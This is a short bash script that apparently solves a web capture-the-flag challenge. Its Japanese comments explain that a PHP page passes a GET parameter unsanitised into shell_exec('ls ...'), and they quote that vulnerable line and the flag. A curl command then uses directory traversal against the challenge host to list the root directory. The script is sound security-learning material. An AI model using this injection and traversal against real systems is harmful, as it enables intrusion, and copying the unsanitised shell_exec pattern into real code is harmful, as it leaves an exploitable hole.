#!/bin/bash

# アクセスするとindex.phpのソースを見せてくれるリンクがある
# 以下のソースから、seasonにディレクトリ名を渡すと、lsコマンドの結果を返してくれることがわかる。
# .文字が使えるため、ディレクトリトラバーサルでrootディレクトリのls結果を取得するとフラグが取得できる
# $fruits = array_filter(explode("\n", shell_exec("ls {$_GET['season']}")), "strlen");
# FLAG: WebC{Y0u_c4n_choo5e_frui7s_with_y0ur_f4vorite_season!_b5d3a864}
curl https://awebc19.archiso.dev/problems/fruits_list/index.php?season=../../../ | xargs -IURL node -e 'url="'URL'";url=decodeURIComponent(url);console.log(url);' | grep --color=auto "WebC{.*}"
